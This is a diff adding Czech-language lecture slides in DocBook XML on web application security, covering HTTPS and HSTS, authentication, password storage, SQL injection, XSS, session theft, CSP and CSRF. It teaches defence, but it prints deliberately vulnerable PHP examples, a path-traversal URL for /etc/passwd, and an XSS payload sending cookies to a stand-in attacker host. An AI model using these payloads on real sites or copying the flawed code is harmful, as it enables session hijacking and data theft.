@@ -1,0 +1,846 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-model href="file:/E:/src/db/xsl/slides/schema/relaxng/slides.rnc" type="application/relax-ng-compact-syntax"?>
+<s:slides xmlns:s="http://docbook.org/ns/docbook-slides" xmlns="http://docbook.org/ns/docbook" xmlns:xl="http://www.w3.org/1999/xlink" xml:lang="cs">
+<info>
+<title>Bezpečnost webových aplikací</title>
+<subtitle>4IZ278 – Webové aplikace</subtitle>
+<author><personname>Jirka Kosek</personname></author>
+<!-- <releaseinfo>Poslední modifikace: $Date: $</releaseinfo> -->
+<copyright>
+<year>2000–2019</year>
+<holder>Jiří Kosek</holder>
+</copyright>
+</info>
+
+<s:foilgroup>
+<title>Úvod</title>
+
+<s:foil>
+<title>Co nás čeká</title>
+
+<itemizedlist>
+<listitem>
+<para>šifrování přenášených dat</para>
+</listitem>
+<listitem>
+<para>autentizace a autorizace uživatelů a aplikací</para>
+</listitem>
+<listitem>
+<para>bezpečnostní slabiny webových aplikací a způsoby ochrany</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+</s:foilgroup>
+
+<s:foilgroup>
+<title>Šifrování přenášených dat</title>
+
+<s:foil>
+<title>Proč šifrovat</title>
+
+<itemizedlist>
+<listitem>
+<para>některá data jsou skutečně citlivá</para>
+<itemizedlist>
+<listitem>
+<para>on-line bankovnictví</para>
+</listitem>
+<listitem>
+<para>komunikace mezi obchodními partnery</para>
+</listitem>
+<listitem>
+<para>vzdálený přístup do podnikového IS</para>
+</listitem>
+</itemizedlist>
+</listitem>
+<listitem>
+<para>kvůli ochraně soukromí a některým typům bezpečnostních útoků je
+dnes trend šifrovat veškerou komunikaci</para>
+</listitem>
+<listitem>
+<para>šifrování zároveň znemožňuje modifikaci obsahu stránky během jejího přenosu</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Jak se dnes šifruje</title>
+
+<itemizedlist>
+<listitem>
+<para>hybridní systémy – kombinace asymetrických a symetrických šifer</para>
+</listitem>
+<listitem>
+<para>pro zabezpečení přenosu se používá SSL (Secure Sockets Layer)
+nebo novější TLS (Trasport Layer Security) – protokoly umožňující
+zašifrovat cokoliv na bázi protokolu TCP</para>
+</listitem>
+<listitem>
+<para>prohlížeč si o zabezpečené připojení řekne pomocí speciálního
+URL ve tvaru</para>
+<programlisting><![CDATA[https://...]]></programlisting>
+</listitem>
+<listitem>
+<para>server se s klientem dohodne na kvalitě šifrování (možnost
+snížení kvality šifrování počítačem mezi klientem a serverem)</para>
+</listitem>
+<listitem>
+<para>protokol HTTP/2 používá v současných prohlížečích šifrování vždy</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>HTTPS od prvního požadavku</title>
+
+<itemizedlist>
+<listitem>
+<para>u webů vyžadujících zabezpečení nesmí být web přístupný přes
+HTTP (bez šifrování)</para></listitem>
+<listitem>
+<para>automatické přesměrování na šifrovanou verzi</para>
+</listitem>
+<listitem>
+<para>novější prohlížeče podporují HSTS (HTTP Strict Transport Security)</para>
+<itemizedlist>
+<listitem><para>server prohlížeči pomocí hlavičky HTTP sdělí, že je povolený přístup pouze přes HTTPS</para></listitem>
+<listitem><para>veškeré odkazy vedoucí na <code>http://</code> se automaticky změní na <code>https://</code></para></listitem>
+<listitem><para>při chybném certifikátu není web přístupný</para></listitem>
+<listitem><para>prohlížeče mají zabudovanou databázi domén, pro které se má použít HSTS (odpadá nutnost prvního, potenciálně nebezpečného požadavku)</para></listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Certifikáty a CA</title>
+
+<itemizedlist>
+<listitem>
+<para>server posílá klientovi certifikát</para>
+</listitem>
+<listitem>
+<para>certifikát – spojuje dohromady počítač s reálně existující
+osobou (fyzickou či právnickou)</para>
+</listitem>
+<listitem>
+<para>certifikát slouží pro ověření totožnosti serveru</para>
+</listitem>
+<listitem>
+<para>certifikát může mít i klient, ale na webu se to zatím moc nepoužívá</para>
+</listitem>
+<listitem>
+<para>certifikát vydává certifikační autorita (CA) – ta by měla
+ověřit skutečnou identitu žadatele o certifikát</para>
+</listitem>
+<listitem>
+<para>prohlížeč automaticky věří certifikátům od CA, které zná (umí
+ověřit podpis na certifikátu)</para>
+</listitem>
+<listitem>
+<para>ostatní certifikáty je potřeba ručně doinstalovat nebo
+doinstalovat CA, která je vystavila</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Získání certifikátu</title>
+
+<itemizedlist>
+<listitem><para>certifikáty prodávají certifikační autority</para></listitem>
+<listitem><para>existuje i možnost získání certifikátu zdarma</para>
+<itemizedlist>
+<listitem><para><link xl:href="https://letsencrypt.org/"/></para></listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+</s:foilgroup>
+
+<s:foilgroup>
+<title>Autentizace a autorizace uživatelů</title>
+
+<s:foil>
+<title>Základní pojmy</title>
+
+<variablelist>
+<varlistentry>
+<term>autentizace</term>
+<listitem>
+<para>ověření totožnosti</para>
+</listitem>
+</varlistentry>
+
+<varlistentry>
+<term>autorizace</term>
+<listitem>
+<para>ověření práv pro vykonání určité činnosti</para>
+</listitem>
+</varlistentry>
+
+</variablelist>
+
+</s:foil>
+
+<s:foil>
+<title>HTTP autentizace</title>
+
+<itemizedlist>
+<listitem>
+<para>standardní součást protokolu HTTP</para>
+</listitem>
+<listitem>
+<para>nelze změnit podobu přihlašovacího okna</para>
+</listitem>
+<listitem>
+<para>obtížně se řeší odhlášení a automatické odhlášení po určité době</para>
+</listitem>
+<listitem>
+<para>bývá implementována na úrovni webového serveru</para>
+</listitem>
+<listitem>
+<para>hesla jsou přenášena v nekódované podobě</para>
+<itemizedlist>
+<listitem>
+<para>lze použít i bezpečnější metodu Digest, kdy se posílají již jen hashe</para>
+</listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Vlastní autentizace</title>
+
+<itemizedlist>
+<listitem>
+<para>využívá HTML formuláře a session proměnné</para>
+</listitem>
+<listitem>
+<para>mnohem větší flexibilita oproti HTTP – vlastní
+přihlašovací stránka, hesla uložená na libovolném místě</para>
+</listitem>
+<listitem>
+<para>v session proměnné se uchovávají informace o přihlášeném
+uživateli a o době jeho posledního přístupu</para>
+</listitem>
+<listitem>
+<para>odhlášení – stačí zrušit session proměnnou</para>
+</listitem>
+<listitem>
+<para>automatické odhlášení – při každém požadavku se porovnává
+aktuální čas s časem posledního přístupu (ten je uložen v session proměnné)</para>
+</listitem>
+<listitem>
+<para>pokud klient podporuje JavaScript, lze použít challenge-response
+mechanismus (heslo není přenášeno v odkrytém tvaru)</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Klientské certifikáty</title>
+
+<itemizedlist>
+<listitem>
+<para>využívá mechanismus SSL/TLS, ale certifikátem se neprokazuje jen
+server, ale i uživatel</para>
+</listitem>
+<listitem>
+<para>uživatelsky méně přívětivé – uživatel musí mít na počítači
+k dispozici svůj certifikát</para>
+</listitem>
+<listitem>
+<para>často je nutný speciální HW jako čtečka čipových karet</para>
+</listitem>
+<listitem>
+<para>využívá se v aplikacích, které potřebují vzbudit zdání větší
+bezpečnosti, např. internetové bankovnictví</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Web Authentication</title>
+
+<itemizedlist>
+<listitem><para>nový standard pro autentizaci na webu</para></listitem>
+<listitem><para>definuje API, pomocí kterého lze generovat páry privátní/veřejný klíč pro každou aplikaci</para></listitem>
+<listitem><para>přihlašování pak probíhá automaticky podepsáním dat privátním klíčem bez nutnosti zadávat heslo</para></listitem>
+<listitem><para>privátní klíče se ukládají na HW token nebo se vše integruje s funkcemi OS – např. FaceID, čtečka otisku prstu, …</para></listitem>
+<listitem><para><link xl:href="https://webauthn.guide/">popis toho, jak funguje WebAuthnWeb Authentication</link></para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>OpenID</title>
+
+<itemizedlist>
+<listitem><para>decentralizovaný mechanismus pro jednotné přihlašování
+k webovým aplikacím (SSO = single sign on)</para></listitem>
+<listitem><para>uživatel používá jednotný OpenID identifikátor v mnoha aplikacích</para></listitem>
+<listitem><para>autentizaci neprovádějí jednotlivé aplikace, ale
+poskytovatel identity</para>
+<itemizedlist>
+<listitem>
+<para>v ČR např. <link xl:href="https://www.mojeid.cz/">mojeID</link></para>
+</listitem>
+</itemizedlist>
+</listitem>
+<listitem><para>poskytovatel identity může aplikaci se souhlasem uživatele
+předat vybrané osobní údaje (např. email, adresa, …) – pohodlné pro
+uživatele</para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>OAuth 2.0</title>
+
+<itemizedlist>
+<listitem><para>mechanismus pro autorizaci aplikací, které mohou
+    využívat prostředky na serveru (API) jménem uživatele</para></listitem>
+<listitem><para>používá například Facebook, Twitter, Google, GitHub, …</para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>OpenID Connect</title>
+
+<itemizedlist>
+<listitem><para>standardizovaný profil OAuth 2.0</para></listitem>
+<listitem><para>nabízí podporu autentizace jako vrstvu nad OAuth 2.0</para></listitem>
+<listitem><para>postupně začíná podporovat většina velkých firem</para></listitem>
+<listitem><para>např. <link xl:href="https://developers.google.com/identity/protocols/OpenIDConnect"/></para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Ukládání hesel</title>
+
+<itemizedlist>
+<listitem>
+<para>aplikace by v žádném případě neměla ukládat hesla v odkryté podobě</para>
+</listitem>
+<listitem>
+<para>ukládání otisku (hashe) hesla nestačí, kvůli předgenerovaným
+slovníkům otisků</para>
+</listitem>
+<listitem>
+<para>doporučené je ukládat otisk hesla a „soli“</para>
+</listitem>
+<listitem>
+<para>pro výpočet otisku je lepší používat pomalé hasovací funkce pro
+ztížení útoku hrubou silou</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+</s:foilgroup>
+
+<s:foilgroup>
+<title>Nejčastější bezpečnostní slabiny aplikací</title>
+
+<s:foil>
+<title>Nekontrolování vstupu od uživatele</title>
+
+<itemizedlist>
+<listitem>
+<para>veškerá data získaná od uživatele by měla být před použitím ověřena</para>
+</listitem>
+<listitem>
+<para>musíme počítat s tím, že uživatel omylem udělá chybu nebo se
+někdo záměrně snaží nabourat do aplikace</para>
+</listitem>
+<listitem>
+<para>data je potřeba vždy validovat na straně serveru, protože
+kód běžící na klientovi může uživatel/útočník měnit (např. AJAXové aplikace)</para>
+</listitem>
+<listitem>
+<para>data pocházející od uživatele (může je měnit)</para>
+<itemizedlist>
+<listitem>
+<para>obsah formulářových polí</para>
+</listitem>
+<listitem>
+<para>URL adresa požadavku</para>
+</listitem>
+<listitem>
+<para>cookies</para>
+</listitem>
+<listitem>
+<para>HTTP hlavičky</para>
+</listitem>
+<listitem>
+<para>požadavky AJAX</para>
+</listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Získání libovolného souboru ze serveru</title>
+<para>Předpokládejme, že máme skript, který generuje webové
+stránky. Obsah stránky získá ze zvoleného souboru a k němu doplní
+standardní hlavičku a patičku. Jednotlivé stránky se tak volají pomocí
+adresy
+<literal>http://example.org/index.php?page=uvodni.inc</literal>.</para>
+<programlisting language="php"><![CDATA[... standardní hlavička v HTML ...
+<?php
+  include $_GET["page"];
+?>
+... standardní patička ...]]></programlisting>
+<para>Co se stane, když zlý uživatel zadá URL ve tvaru
+<literal>http://example.org/index.php?page=/etc/passwd</literal>?</para>
+</example>
+
+<example>
+<title>Správné řešení s kontrolou dovolených vstupů</title>
+<programlisting language="php"><![CDATA[... standardní hlavička v HTML ...
+<?php
+  if (in_array($_GET["page"], array("uvod.inc", "cenik.inc", "kontakt.inc"))
+  { 
+    include $_GET["page"];
+  }
+  else
+  {
+    echo "Požadovaná stránka neexistuje. Pokračujte na 
+          <a href='index.php?page=uvod.inc'>úvodní stránce</a>.";
+  }
+?>
+... standardní patička ...]]></programlisting>
+</example>
+
+</s:foil>
+
+<s:foil>
+<title>Způsob kontroly</title>
+
+<itemizedlist>
+<listitem><para>whitelisting</para>
+<itemizedlist>
+<listitem><para>explicitně vyjmenujeme co je dovoleno</para></listitem>
+<listitem><para>výrazně snižuje možnost útoku</para></listitem>
+<listitem><para>nelze použít vždy</para></listitem>
+</itemizedlist>
+</listitem>
+<listitem><para>blacklisting</para>
+<itemizedlist>
+<listitem><para>kontrolujeme, co není dovoleno</para></listitem>
+<listitem><para>vždy existuje možnost, že na něco zapomeneme</para></listitem>
+<listitem><para>kontrolní kód je potřeba neustále udržovat s tím, jak
+se objevují nové typy útoků</para></listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Reakce na nepovolený vstup</title>
+
+<itemizedlist>
+<listitem><para>musíme logovat pro další případnou analýzu, pokud by
+útok byl úspěný</para></listitem>
+<listitem><para>uživateli vrátíme obecnou stránku oznamující chybu</para></listitem>
+<listitem><para>chybová stránka by neměla obsahovat příliš detailů</para></listitem>
+<listitem><para>do chybové stránky nevypisujeme data z požadavku – další potencionální díra</para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>SQL injection</title>
+
+<itemizedlist>
+<listitem>
+<para>skripty často konstruují SQL dotaz dynamicky na základě vstupů</para>
+</listitem>
+<listitem>
+<para>vstupy se musí pečlivě kontrolovat, aby chybný vstup neumožnil
+spuštění libovolného SQL příkazu</para>
+<itemizedlist>
+<listitem>
+<para>„whitelisting“ povolených znaků</para>
+</listitem>
+<listitem>
+<para>prepared statements (prepare šablona + dosazení parametrů při execute)</para>
+</listitem>
+<listitem>
+<para>escapovací funkce
+(<function>mysql_real_escape_string()</function>, <function>PDO::quote()</function>)</para>
+</listitem>
+</itemizedlist>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Chybný skript umožňující SQL injection</title>
+<para>Formulář obsahuje vstupní pole <literal>jmeno</literal> pro
+zadání hledaného jména</para>
+<programlisting language="php"><![CDATA[<?php
+...
+$jmeno = $_GET["jmeno"];
+$spojeni = ODBC_Connect("test", "user", "password");
+$vysledek = ODBC_Exec($spojeni, 
+            "SELECT * FROM Zamestnanci
+             WHERE Jmeno LIKE '$jmeno%' 
+             ORDER BY Jmeno");
+...
+?>]]></programlisting>
+</example>
+
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Správné řešení s kontrolou vstupu</title>
+<para>Před předáním dat dotazu se testuje, zda řetězec obsahuje jen
+povolené znaky</para>
+<programlisting language="php"><![CDATA[<?php
+...
+$jmeno = $_GET["jmeno"];
+if (!ERegI("^[a-z]+$" , $jmeno))
+{
+  echo "Hledaný text může obsahovat jen písmena.";
+  exit;
+}
+$spojeni = ODBC_Connect("test", "user", "password");
+$vysledek = ODBC_Exec($spojeni, 
+            "SELECT * FROM Zamestnanci
+             WHERE Jmeno LIKE '$jmeno%' 
+             ORDER BY Jmeno");
+...
+?>]]></programlisting>
+</example>
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Správné řešení s prepared statements</title>
+<para>Samo databázové API se postará o to, aby předaný parametr nemohl
+změnit syntaxi příkazu SQL</para>
+<programlisting language="php"><![CDATA[<?php
+...
+$jmeno = $_GET["jmeno"] . '%';
+$dbh = new PDO('mysql:host=localhost;dbname=test', $user, $pass);
+$stmt = $dbh->prepare("SELECT * FROM Zamestnanci
+             WHERE Jmeno LIKE :jmeno
+             ORDER BY Jmeno");
+$stmt->bindParam(':jmeno', $jmeno);
+$stmt->execute();
+...
+?>]]></programlisting>
+</example>
+
+</s:foil>
+
+<s:foil>
+<title>XSS</title>
+<subtitle>Cross-Site Scripting</subtitle>
+
+<itemizedlist>
+<listitem>
+<para>veškerý uživatelsky generovaný vstup musí být před vložením do
+stránky správně escapován (diskusní fóra, zobrazení údajů z formuláře,
+…)</para>
+</listitem>
+<listitem>
+<para>v opačném případě může útočník do stránky vložit Javascript,
+který se spustí všem a může odesílat citlivé údaje jako session id</para>
+</listitem>
+<listitem>
+<para>escapovací funkce v PHP: <function>strip_tags()</function>,
+<function>htmlspecialchars()</function></para>
+</listitem>
+<listitem>
+<para>nepoužívat chytrá řešení, často si neporadí se záludnými situacemi</para>
+<programlisting><![CDATA[<src<script>ipt>…]]></programlisting>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Ochrana session</title>
+
+<itemizedlist>
+<listitem>
+<para>jediná 100% spolehlivá ochrana je SSL a vypnuté posílání HTTP
+hlavičky <literal>Referer</literal></para>
+</listitem>
+<listitem>
+<para>útok spočívá ve špatné kontrole vstupu a v cross-site skriptování</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Získání session-id přenášeného v URL</title>
+<orderedlist inheritnum="ignore" continuation="restarts">
+<listitem>
+<para>na serveru, kde je uživatel přihlášen, je diskusní fórum</para>
+</listitem>
+<listitem>
+<para>útočník do diskusního fóra přidá příspěvek s odkazem vedoucím
+na jeho server (odkaz musí být zajímavý, aby zaujal)</para>
+</listitem>
+<listitem>
+<para>skript na útočníkově serveru z HTTP hlavičky
+<literal>Referer</literal> získá kompletní URL předchozí stránky
+včetně session-id</para>
+</listitem>
+<listitem>
+<para>pomocí získaného session-id se útočník může přihlásit na server
+pod jménem uživatele a číst jeho data, změnit heslo, …</para>
+</listitem>
+<listitem>
+<para>snížení rizika:</para>
+<itemizedlist>
+<listitem>
+<para>všechny odkazy ve vložených příspěvcích přesměrovávat přes
+pomocnou stránku, která již v URL nemá session-id</para>
+</listitem>
+<listitem>
+<para>blokovat odesílání hlavičky Referer pomocí
+<code>Referrer-Policy: no-referrer</code> (zatím nepodporují všechny
+prohlížeče)</para>
+</listitem>
+<listitem>
+<para>dodatečná kontrola session-id (kontrola shody IP adresy,
+session-id se mění pro každou stránku)</para>
+</listitem>
+</itemizedlist>
+</listitem>
+</orderedlist>
+</example>
+</s:foil>
+
+<s:foil>
+
+<example>
+<title>Ochrana session-id přenášeného v cookie</title>
+<orderedlist inheritnum="ignore" continuation="restarts">
+<listitem>
+<para>na serveru, kde je uživatel přihlášen je diskusní fórum</para>
+</listitem>
+<listitem>
+<para>útočník do diskusního fóra přidá příspěvek s kusem JS kódu,
+který čte cookie</para>
+<programlisting><![CDATA[<script>document.write('<img src="http://utocnik.cz/steal?'+document.cookie+'">')</script>]]></programlisting>
+</listitem>
+<listitem>
+<para>útočníkův skript získá obsah cookie a může ji zneužít</para>
+</listitem>
+<listitem>
+<para>ochrana:</para>
+<itemizedlist>
+<listitem>
+<para>jako v předchozím případě</para>
+</listitem>
+<listitem>
+<para>session-id přenášet pomocí „HttpOnly“ cookie (nejde číst pomocí JS)</para>
+</listitem>
+<listitem>
+<para>důsledná kontrola vstupních dat, nedovolit zadání HTML a JS kódu
+do příspěvku</para>
+</listitem>
+</itemizedlist>
+</listitem>
+</orderedlist>
+
+</example>
+
+</s:foil>
+
+<s:foil>
+<title>Content Security Policy</title>
+
+<itemizedlist>
+<listitem><para>podstatou mnoha XSS útoků je načtení skriptu či jiných zdrojů z webu útočníka</para></listitem>
+<listitem><para>pomocí HTTP hlavičky může aplikace zakázat prohlížeči
+některé operace, které jsou často zneužívány k XSS
+útokům</para></listitem>
+<listitem><para>např. povolení pouze vlastních skriptů a skriptů načítaných z dané domény</para>
+<programlisting>Content-Security-Policy: script-src 'self' https://apis.google.com</programlisting>
+</listitem>
+<listitem><para>při použití CSP jsou automaticky blokovány inline skripty, atributy pro obsluhu událostí, element <tag>style</tag>, …</para></listitem>
+
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Same Origin Policy</title>
+
+<itemizedlist>
+<listitem><para>pro zvýšení bezpečnosti prohlížeče v praxi uplatňují tzv. Same Origin Policy</para></listitem>
+<listitem><para>např. AJAXový požadavek může skript odeslat jen na server se stejným „origin“</para></listitem>
+<listitem><para>origin – protokol, doména, port</para></listitem>
+<listitem><para>v případě potřeby lze omezení změnit pomocí hlaviček CORS</para></listitem>
+
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>CSRF</title>
+<subtitle>Cross-Site Request Forgery</subtitle>
+
+<itemizedlist>
+<listitem>
+<para>útočník vyvolá falešné HTTP požadavky a pokud je v tu chvíli
+uživatel přihlášen (např. přes session), operace se provede</para>
+</listitem>
+<listitem>
+<para>stav měnící operace by neměly být dostupné pomocí metody GET</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Další problémy</title>
+
+<itemizedlist>
+<listitem>
+<para>špatná konfigurace serveru a jeho operačního systému</para>
+</listitem>
+<listitem>
+<para>špatná správa a ukládání hesel aplikace</para>
+</listitem>
+<listitem>
+<para>nekontrolování přístupu k operacím a objektům zadaným přímo do
+URL po prvotní autentizaci a autorizaci</para>
+</listitem>
+<listitem>
+<para>vystavení citlivých dat na „tajné URL adrese“</para>
+</listitem>
+<listitem>
+<para>neaktualizovaní rozšířených komponent (redakční systémy,
+diskusní fóra, …)</para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Kdy a kde provádět kontrolu</title>
+
+<itemizedlist>
+<listitem>
+<para>nesmíme věřit nikomu, ani vlastní databázi (útok, zadání dat z jiné aplikace, …)</para>
+</listitem>
+<listitem><para>je proto potřeba ošetřovat veškeré vstupy</para></listitem>
+<listitem><para>a escapovat veškeré výstupy</para></listitem>
+</itemizedlist>
+
+</s:foil>
+
+
+</s:foilgroup>
+
+<s:foilgroup>
+<title>Pár slov závěrem</title>
+<s:foil>
+<title>Pár slov závěrem</title>
+
+<para><emphasis>Nepodceňovat!!!!!!!!!!!</emphasis></para>
+
+<mediaobject>
+<imageobject>
+<imagedata fileref="https://imgs.xkcd.com/comics/exploits_of_a_mom.png"/>
+</imageobject>
+</mediaobject>
+
+</s:foil>
+</s:foilgroup>
+
+<s:foilgroup>
+<title>Zdroje informací</title>
+
+
+<s:foil>
+<title>Povinná četba</title>
+
+<itemizedlist>
+<listitem>
+<para><link
+xl:href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">Deset
+nejčastějších bezpečnostních slabin</link></para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+<s:foil>
+<title>Další zajímavé zdroje</title>
+
+<itemizedlist>
+<listitem>
+<para><link xl:href="http://id.vse.cz"/> – možnost jednotného přihlášení na servery VŠE (využívá SAML)</para>
+</listitem>
+<!--
+<listitem>
+<para><link xl:href="http://www.seifried.org/security/www-auth/">WWW
+Authentication</link> – rozsáhlý článek o možnostech
+autentizace na webu</para>
+</listitem>
+-->
+<listitem><para><link xl:href="https://webauthn.guide/">Web Authentication</link> – popis toho, jak funguje WebAuthn</para></listitem>
+<listitem>
+<para><link
+xl:href="https://www.michalspacek.cz/prednasky/zahashovat-heslo-ulozit-profit-develcz">Přednáška Michala Špačka o bezpečném ukládání hesel</link></para>
+</listitem>
+<listitem>
+<para><link
+xl:href="http://prdownloads.sourceforge.net/owasp/OWASPGuide2.0.1.pdf?download">OWASP Guide to Building Secure Web Applications</link></para>
+</listitem>
+<listitem>
+<para><link xl:href="http://www.owasp.org">Open Web Application Security
+Project</link> – popis nejčastějších druhů bezpečnostních chyb
+v aplikacích</para>
+</listitem>
+<listitem>
+<para><link xl:href="http://web.archive.org/web/20051026171811/http://www.underground.cz/969">Pěkná ukázka využití SQL
+injection pro nabourání do špatně zabezpečeného serveru</link></para>
+</listitem>
+<listitem>
+<para><link xl:href="http://tools.ietf.org/html/rfc6797">RFC 6797: HTTP Strict Transport Security (HSTS)</link></para>
+</listitem>
+</itemizedlist>
+
+</s:foil>
+
+</s:foilgroup>
+
+</s:slides>
